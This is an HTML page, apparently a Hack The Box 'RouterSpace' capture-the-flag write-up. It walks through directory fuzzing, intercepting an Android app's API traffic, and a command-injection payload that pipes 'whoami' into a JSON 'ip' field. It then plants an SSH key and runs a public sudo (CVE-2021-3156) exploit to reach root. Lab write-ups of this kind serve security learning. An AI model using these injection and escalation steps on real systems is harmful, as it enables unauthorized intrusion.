+</span></span><span class="line"><span class="cl">         <span class="se">\ \_\ </span>  <span class="se">\ \_\ </span> <span class="se">\ \_</span>___/  <span class="se">\ \_\ </span>      
+</span></span><span class="line"><span class="cl">          <span class="se">\/</span>_/    <span class="se">\/</span>_/   <span class="se">\/</span>___/    <span class="se">\/</span>_/       
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">       v1.3.1 Kali Exclusive &lt;<span class="m">3</span>
+</span></span><span class="line"><span class="cl">________________________________________________
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> :: Method           : GET
+</span></span><span class="line"><span class="cl"> :: URL              : http://routerspace.htb/FUZZ
+</span></span><span class="line"><span class="cl"> :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
+</span></span><span class="line"><span class="cl"> :: Extensions       : .php .txt .js .html 
+</span></span><span class="line"><span class="cl"> :: Output file      : dir.common.routerspace
+</span></span><span class="line"><span class="cl"> :: File format      : md
+</span></span><span class="line"><span class="cl"> :: Follow redirects : <span class="nb">false</span>
+</span></span><span class="line"><span class="cl"> :: Calibration      : <span class="nb">false</span>
+</span></span><span class="line"><span class="cl"> :: Timeout          : <span class="m">10</span>
+</span></span><span class="line"><span class="cl"> :: Threads          : <span class="m">40</span>
+</span></span><span class="line"><span class="cl"> :: Matcher          : Response status: 200,204,301,302,307,401,403,405
+</span></span><span class="line"><span class="cl">________________________________________________
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">.bash_history           <span class="o">[</span>Status: 200, Size: 68, Words: 12, Lines: 3<span class="o">]</span>
+</span></span><span class="line"><span class="cl">.config.html            <span class="o">[</span>Status: 200, Size: 73, Words: 15, Lines: 7<span class="o">]</span>
+</span></span><span class="line"><span class="cl">.cache.html             <span class="o">[</span>Status: 200, Size: 69, Words: 15, Lines: 6<span class="o">]</span>
+</span></span><span class="line"><span class="cl">.cvs.html               <span class="o">[</span>Status: 200, Size: 71, Words: 15, Lines: 2<span class="o">]</span>
+</span></span><span class="line"><span class="cl">.cvs.php                <span class="o">[</span>Status: 200, Size: 71, Words: 17, Lines: 4<span class="o">]</span>
+</span></span><span class="line"><span class="cl">.config                 <span class="o">[</span>Status: 200, Size: 70, Words: 16, Lines: 5<span class="o">]</span>
+</span></span><span class="line"><span class="cl">.cvsignore              <span class="o">[</span>Status: 200, Size: 67, Words: 16, Lines: 4<span class="o">]</span>
+</span></span><span class="line"><span class="cl">.cvs.js                 <span class="o">[</span>Status: 200, Size: 62, Words: 16, Lines: 2<span class="o">]</span>
+</span></span><span class="line"><span class="cl">.cvsignore.txt          <span class="o">[</span>Status: 200, Size: 78, Words: 16, Lines: 3<span class="o">]</span>
+</span></span><span class="line"><span class="cl">.bashrc.txt             <span class="o">[</span>Status: 200, Size: 71, Words: 15, Lines: 5<span class="o">]</span>
+</span></span><span class="line"><span class="cl">.forward.js             <span class="o">[</span>Status: 200, Size: 68, Words: 13, Lines: 8<span class="o">]</span>
+</span></span><span class="line"><span class="cl">.bash_history.txt       <span class="o">[</span>Status: 200, Size: 73, Words: 15, Lines: 7<span class="o">]</span>
+</span></span><span class="line"><span class="cl">.cache.php              <span class="o">[</span>Status: 200, Size: 82, Words: 17, Lines: 8<span class="o">]</span>
+</span></span><span class="line"><span class="cl">.cache                  <span class="o">[</span>Status: 200, Size: 70, Words: 17, Lines: 6<span class="o">]</span>
+</span></span><span class="line"><span class="cl">.cvsignore.js           <span class="o">[</span>Status: 200, Size: 74, Words: 15, Lines: 8<span class="o">]</span>
+</span></span><span class="line"><span class="cl">.bash_history.js        <span class="o">[</span>Status: 200, Size: 71, Words: 16, Lines: 6<span class="o">]</span>
+</span></span><span class="line"><span class="cl">.txt                    <span class="o">[</span>Status: 200, Size: 80, Words: 18, Lines: 5<span class="o">]</span>
+</span></span><span class="line"><span class="cl">.cvs.txt                <span class="o">[</span>Status: 200, Size: 74, Words: 17, Lines: 7<span class="o">]</span>
+</span></span><span class="line"><span class="cl">.bashrc.js              <span class="o">[</span>Status: 200, Size: 73, Words: 16, Lines: 8<span class="o">]</span>
+</span></span><span class="line"><span class="cl">.config.txt             <span class="o">[</span>Status: 200, Size: 78, Words: 20, Lines: 8<span class="o">]</span>
+</span></span><span class="line"><span class="cl">.html                   <span class="o">[</span>Status: 200, Size: 73, Words: 14, Lines: 8<span class="o">]</span>
+</span></span><span class="line"><span class="cl">.forward.html           <span class="o">[</span>Status: 200, Size: 76, Words: 18, Lines: 1<span class="o">]</span>
+</span></span><span class="line"><span class="cl">.cvsignore.html         <span class="o">[</span>Status: 200, Size: 76, Words: 17, Lines: 6<span class="o">]</span>
+</span></span><span class="line"><span class="cl">.bashrc                 <span class="o">[</span>Status: 200, Size: 72, Words: 15, Lines: 5<span class="o">]</span>
+</span></span><span class="line"><span class="cl">.config.js              <span class="o">[</span>Status: 200, Size: 69, Words: 14, Lines: 7<span class="o">]</span>
+</span></span><span class="line"><span class="cl">.bash_history.php       <span class="o">[</span>Status: 200, Size: 77, Words: 19, Lines: 5<span class="o">]</span>
+</span></span><span class="line"><span class="cl">.bash_history.html      <span class="o">[</span>Status: 200, Size: 71, Words: 14, Lines: 2<span class="o">]</span>
+</span></span><span class="line"><span class="cl">.forward.php            <span class="o">[</span>Status: 200, Size: 69, Words: 16, Lines: 1<span class="o">]</span>
+</span></span><span class="line"><span class="cl">.forward                <span class="o">[</span>Status: 200, Size: 69, Words: 13, Lines: 1<span class="o">]</span>
+</span></span><span class="line"><span class="cl">.bashrc.html            <span class="o">[</span>Status: 200, Size: 72, Words: 14, Lines: 1<span class="o">]</span>
+</span></span><span class="line"><span class="cl">.bashrc.php             <span class="o">[</span>Status: 200, Size: 72, Words: 14, Lines: 6<span class="o">]</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="routerspace-webpage">RouterSpace Webpage</h2>
+<h3 id="homepage">Homepage</h3>
+<p>On logging on to <a href="http://routerspace.htb" target="_blank" rel="noopener noreffer">http://routerspace.htb</a>
+<figure><img src="/images/routerspace/homepage.png"/><figcaption>
+            <h4>Homepage</h4>
+        </figcaption>
+</figure>
+</p>
+<h3 id="additional-links-found">Additional Links Found</h3>
+<ul>
+<li>Downloaded the apk for further analysis</li>
+</ul>
+<figure><img src="/images/routerspace/APK.png"/><figcaption>
+            <h4>RouterSpace.apk</h4>
+        </figcaption>
+</figure>
+
+<h3 id="installing-anbox-and-apk">Installing Anbox and APK</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌─<span class="o">[</span>babayaga@babayaga-virtualbox<span class="o">]</span>─<span class="o">[</span>~/Downloads<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└──╼ <span class="nv">$adb</span> install RouterSpace.apk 
+</span></span><span class="line"><span class="cl">* daemon not running<span class="p">;</span> starting now at tcp:5037
+</span></span><span class="line"><span class="cl">* daemon started successfully
+</span></span><span class="line"><span class="cl">Performing Streamed Install
+</span></span><span class="line"><span class="cl">Success
+</span></span></code></pre></td></tr></table>
+</div>
+</div><figure><img src="/images/routerspace/Anbox.png"/><figcaption>
+            <h4>RouterSpace.apk in Anbox</h4>
+        </figcaption>
+</figure>
+
+<h3 id="proxy-settings">Proxy settings</h3>
+<ul>
+<li>Burp was configured such that it will intercept the requests on port 8999 from all the interfaces
+<ul>
+<li><em>I forgot to take the screenshop</em> but you can follow these steps:
+<ul>
+<li>Proxy&gt;Options&gt;ProxyListenser&gt;Add and configure suitably</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>To Anbox to send request on 8999, read the following link
+<a href="https://github.com/anbox/anbox/issues/398" target="_blank" rel="noopener noreffer">It is not possible to set proxy settings for network connection · Issue #398 · anbox/anbox · GitHub</a></li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">─<span class="o">[</span>babayaga@babayaga-virtualbox<span class="o">]</span>─<span class="o">[</span>~/Desktop<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└──╼ <span class="nv">$adb</span> shell settings put global http_proxy 192.168.250.1:8999
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>Reference for configuration*
+<figure><img src="/images/routerspace/ProxySettings.png"/><figcaption>
+            <h4>Reference Guide to Proxy Configuration</h4>
+        </figcaption>
+</figure>
+</li>
+</ul>
+<h3 id="request">Request</h3>
+<ul>
+<li>Request the routerspace.apk was sending</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">POST /api/v4/monitoring/router/dev/check/deviceAccess HTTP/1.1
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">accept: application/json, text/plain, */*
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">user-agent: RouterSpaceAgent
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Content-Type: application/json
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Content-Length: <span class="m">16</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Host: routerspace.htb
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Connection: close
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Accept-Encoding: gzip, deflate
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">{</span><span class="s2">&#34;ip&#34;</span>:<span class="s2">&#34;0.0.0.0&#34;</span><span class="o">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><figure><img src="/images/routerspace/RouterAPKRequest.png"/><figcaption>
+            <h4>Captured Request</h4>
+        </figcaption>
+</figure>
+
+<h3 id="foothold">Foothold</h3>
+<ul>
+<li>Request is vulnerable to command injection</li>
+</ul>
+<figure><img src="/images/routerspace/Command_Injection.png"/><figcaption>
+            <h4>Vulnerable to Command Injection</h4>
+        </figcaption>
+</figure>
+
+<h4 id="request-1">Request</h4>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">POST /api/v4/monitoring/router/dev/check/deviceAccess HTTP/1.1
+</span></span><span class="line"><span class="cl">accept: application/json, text/plain, */*
+</span></span><span class="line"><span class="cl">user-agent: RouterSpaceAgent
+</span></span><span class="line"><span class="cl">Content-Type: application/json
+</span></span><span class="line"><span class="cl">Content-Length: 25
+</span></span><span class="line"><span class="cl">Host: routerspace.htb
+</span></span><span class="line"><span class="cl">Connection: close
+</span></span><span class="line"><span class="cl">Accept-Encoding: gzip, deflate
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">{&#34;ip&#34;:&#34;0.0.0.0 | whoami&#34;}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="response">Response</h4>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">HTTP/1.1 200 OK
+</span></span><span class="line"><span class="cl">X-Powered-By: RouterSpace
+</span></span><span class="line"><span class="cl">X-Cdn: RouterSpace-7530
+</span></span><span class="line"><span class="cl">Content-Type: application/json; charset=utf-8
+</span></span><span class="line"><span class="cl">Content-Length: 8
+</span></span><span class="line"><span class="cl">ETag: W/&#34;8-qTM+b2Uq+FmQphCm7m1RM+pENkU&#34;
+</span></span><span class="line"><span class="cl">Date: Sun, 06 Mar 2022 13:33:23 GMT
+</span></span><span class="line"><span class="cl">Connection: close
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">&#34;paul\n&#34;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="foothold-1">Foothold</h2>
+<ul>
+<li>No request for reverse shell worked</li>
+<li>But /home/paul/.ssh had write privileges</li>
+<li>Created an ssh key pair</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌─<span class="o">[</span>babayaga@babayaga-virtualbox<span class="o">]</span>─<span class="o">[</span>~/.ssh<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└──╼ <span class="nv">$ssh</span>-keygen
+</span></span><span class="line"><span class="cl">Generating public/private rsa key pair.
+</span></span><span class="line"><span class="cl">Enter file in which to save the key <span class="o">(</span>/home/babayaga/.ssh/id_rsa<span class="o">)</span>: tmp
+</span></span><span class="line"><span class="cl">Enter passphrase <span class="o">(</span>empty <span class="k">for</span> no passphrase<span class="o">)</span>: 
+</span></span><span class="line"><span class="cl">Enter same passphrase again: 
+</span></span><span class="line"><span class="cl">Your identification has been saved in forRouterSpace
+</span></span><span class="line"><span class="cl">Your public key has been saved in forRouterSpace.pub
+</span></span><span class="line"><span class="cl">The key fingerprint is:
+</span></span><span class="line"><span class="cl">SHA256:22ZtDCb89y6FRut4jEgFTkumJ1owa7TZJXcri3o1AvM babayaga@babayaga-virtualbox
+</span></span><span class="line"><span class="cl">The key<span class="err">&#39;</span>s randomart image is:
+</span></span><span class="line"><span class="cl">+---<span class="o">[</span>RSA 3072<span class="o">]</span>----+
+</span></span><span class="line"><span class="cl"><span class="p">|</span>                 <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>    + . B .      <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   . B X + .     <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>    <span class="nv">B</span> <span class="o">=</span>.<span class="o">=</span> o .    <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   . * +S+o. o   <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>    . <span class="nv">E</span> <span class="o">=</span>* ++ .  <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     . +.o<span class="o">=</span>*<span class="o">=</span>.   <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>    . . .ooo<span class="o">=</span>.   <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     .     . oo  <span class="p">|</span>
+</span></span><span class="line"><span class="cl">+----<span class="o">[</span>SHA256<span class="o">]</span>-----+
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>
+<p>Appended the id_rsa.pub to /home/paul/.ssh/authorized_keys on routerspace.htb
+<figure><img src="/images/routerspace/not_sure_got_created_keys.png"/><figcaption>
+            <h4>Appending keys to authorized_keys on routerspace.htb</h4>
+        </figcaption>
+</figure>
+</p>
+</li>
+<li>
+<p>Logged in using id_rsa (private key)</p>
+</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo ssh -i tmp paul@routerspace.htb
+</span></span><span class="line"><span class="cl"><span class="o">[</span>sudo<span class="o">]</span> password <span class="k">for</span> babayaga: 
+</span></span><span class="line"><span class="cl">The authenticity of host <span class="s1">&#39;routerspace.htb (10.129.152.7)&#39;</span> can<span class="s1">&#39;t be established.
+</span></span></span><span class="line"><span class="cl"><span class="s1">ECDSA key fingerprint is SHA256:M4jDfH65U/Fw7jjmKhTZcb9LgW/gi23OjcLjM1bA5UY.
+</span></span></span><span class="line"><span class="cl"><span class="s1">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+</span></span></span><span class="line"><span class="cl"><span class="s1">Warning: Permanently added &#39;</span>routerspace.htb,10.129.152.7<span class="s1">&#39; (ECDSA) to the list of known hosts.
+</span></span></span><span class="line"><span class="cl"><span class="s1">Enter passphrase for key &#39;</span>tmp<span class="err">&#39;</span>: 
+</span></span><span class="line"><span class="cl">Welcome to Ubuntu 20.04.3 LTS <span class="o">(</span>GNU/Linux 5.4.0-90-generic x86_64<span class="o">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><figure><img src="/images/routerspace/LoginUser.png"/><figcaption>
+            <h4>UserLogin</h4>
+        </figcaption>
+</figure>
+
+<h3 id="user-flag">User Flag</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">paul@routerspace:~$ cat user.txt 
+</span></span><span class="line"><span class="cl">3b53f478b34b94d32ea6b38ed6815a30
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="privilege-escalation">Privilege Escalation</h2>
+<ul>
+<li>IP tables config prohibiting outgoing request, so could not get a reverse shell and can&rsquo;t use curl or wget to tranferfile by creating a web server locally</li>
+</ul>
+<figure><img src="/images/routerspace/No_outgoing_Port.png"/><figcaption>
+            <h4>Outbound connection banned maybe some iptables config</h4>
+        </figcaption>
+</figure>
+
+<ul>
+<li>Transfered the linpeas.sh using scp as curl and wget wouldn&rsquo;t have worked because of iptables config</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌─<span class="o">[</span>✗<span class="o">]</span>─<span class="o">[</span>babayaga@babayaga-virtualbox<span class="o">]</span>─<span class="o">[</span>/opt/Scripts<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└──╼ <span class="nv">$sudo</span> scp -i /home/babayaga/.ssh/tmp linpeas.sh paul@routerspace.htb:/home/paul/
+</span></span><span class="line"><span class="cl">Enter passphrase <span class="k">for</span> key <span class="s1">&#39;/home/babayaga/.ssh/tmp&#39;</span>: 
+</span></span><span class="line"><span class="cl">linpeas.sh                                    100%  746KB  36.8KB/s   00:20   
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="executing-linpeassh">Executing Linpeas.sh</h3>
+<figure><img src="/images/routerspace/priv_esc.png"/><figcaption>
+            <h4>Vulnerable Sudo version</h4>
+        </figcaption>
+</figure>
+
+<h4 id="sudo-version-exploit">Sudo version exploit</h4>
+<p><a href="https://github.com/worawit/CVE-2021-3156/blob/main/exploit_nss.py" target="_blank" rel="noopener noreffer">CVE-2021-3156/exploit_nss.py at main · worawit/CVE-2021-3156 · GitHub</a></p>
+<p>=&gt; Executed exploit and got root flag</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">paul@routerspace:~$ python3 exploit.py 
+</span></span><span class="line"><span class="cl"><span class="c1"># ls</span>
+</span></span><span class="line"><span class="cl">exploit.py  libnss_X  linpeas.sh  snap	user.txt
+</span></span><span class="line"><span class="cl"><span class="c1"># whoami</span>
+</span></span><span class="line"><span class="cl">root
+</span></span><span class="line"><span class="cl"><span class="c1"># cd /root</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># ls</span>
+</span></span><span class="line"><span class="cl">root.txt
+</span></span><span class="line"><span class="cl"><span class="c1"># cat root.txt</span>
+</span></span><span class="line"><span class="cl">e741e9561463f0227c04aacb069e1cec
+</span></span><span class="line"><span class="cl"><span class="c1"># </span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><figure><img src="/images/routerspace/root.png"/><figcaption>
+            <h4>Root Access</h4>
+        </figcaption>
+</figure>
+
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2022-03-07</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span>
+                            <a class="link-to-markdown" href="/routerspace/index.md" target="_blank">Read Markdown</a>
+                        </span></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://www.yashhacksstuff.tech/routerspace/" data-title="HTB Routerspace Writeup" data-hashtags="Linux,Easy,APK,Anbox,Active"><i class="fab fa-twitter fa-fw"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://www.yashhacksstuff.tech/routerspace/" data-hashtag="Linux"><i class="fab fa-facebook-square fa-fw"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="https://www.yashhacksstuff.tech/routerspace/" data-title="HTB Routerspace Writeup"><i class="fab fa-hacker-news fa-fw"></i></a><a href="javascript:void(0);" title="Share on Reddit" data-sharer="reddit" data-url="https://www.yashhacksstuff.tech/routerspace/"><i class="fab fa-reddit fa-fw"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="https://www.yashhacksstuff.tech/routerspace/" data-title="HTB Routerspace Writeup"><i data-svg-src="/lib/simple-icons/icons/line.min.svg"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://www.yashhacksstuff.tech/routerspace/" data-title="HTB Routerspace Writeup"><i class="fab fa-weibo fa-fw"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/linux/">Linux</a>,&nbsp;<a href="/tags/easy/">Easy</a>,&nbsp;<a href="/tags/apk/">APK</a>,&nbsp;<a href="/tags/anbox/">Anbox</a>,&nbsp;<a href="/tags/active/">Active</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/firstpost/" class="prev" rel="prev" title="HTB Horizontall Writeup"><i class="fas fa-angle-left fa-fw"></i>HTB Horizontall Writeup</a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line"></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw"></i>
+            </a>
+        </div><script type="text/javascript" src="/lib/smooth-scroll/smooth-scroll.min.js"></script><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/algoliasearch/algoliasearch-lite.umd.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/twemoji/twemoji.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":100},"comment":{},"search":{"algoliaAppID":"PASDMWALPK","algoliaIndex":"index.en","algoliaSearchKey":"b42948e51daaa93df92381c8e2ac0f93","highlightTag":"em","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30,"type":"algolia"},"twemoji":true};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
